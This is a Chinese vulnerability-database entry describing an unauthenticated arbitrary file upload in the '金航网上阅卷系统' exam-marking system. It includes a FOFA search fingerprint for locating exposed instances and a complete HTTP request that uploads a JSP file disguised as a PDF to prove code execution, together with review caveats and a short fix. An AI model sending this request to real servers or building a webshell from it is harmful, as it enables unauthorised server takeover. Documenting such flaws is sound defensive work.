---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "金航网上阅卷系统 fileUpload任意上传"
product: "金航网上阅卷系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，JSP执行与上传命名覆盖条件"
prerequisites: "匿名声称"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E8%88%AA%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9F/%E9%87%91%E8%88%AA%E7%BD%91%E4%B8%8A%E9%98%85%E5%8D%B7%E7%B3%BB%E7%BB%9FfileUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"js/insteadSelect/jquery.insteadSelect.css\""
fofa_unverified: "body="
id: "vw-f0b2c86fbae75903c1a10593"
entity_id: "ve-f0b2c86fbae75903c1a10593"
schema_version: "1"
---

# 金航网上阅卷系统 fileUpload任意上传

## 条目说明

- 对象与具体问题：金航网上阅卷系统；fileUpload任意上传
- 版本、配置及部署条件：未知版本，JSP执行与上传命名覆盖条件
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- multipart原始filename=poc.jsp而uploadFileName=1.jsp，需说明实际采用哪个字段与框架绑定
- 标记JSP只在执行回显时支持RCE，路径/结果依未视检截图
- Content-Length351静态，正文HTTP无围栏；修复/在野依据缺

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

金航网上阅卷系统fileUpload 接口存在文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。

## 影响版本

金航网上阅卷系统

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="js/insteadSelect/jquery.insteadSelect.css"

POC/EXP：

```http
POST /fileUpload HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 127.0.0.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 351
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="upload"; filename="poc.jsp"
Content-Type: application/pdf

<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="uploadContentType"

pdf
--00content0boundary00
Content-Disposition: form-data; name="uploadFileName"

1.jsp
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 351；保留原始标头；其数值未据实际请求体重新计算或验证。


![image-20241112113630109](./.resource/金航网上阅卷系统fileUpload任意文件上传漏洞/media/image-20241112113630109.png)


![image-20241112113647743](./.resource/金航网上阅卷系统fileUpload任意文件上传漏洞/media/image-20241112113647743.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
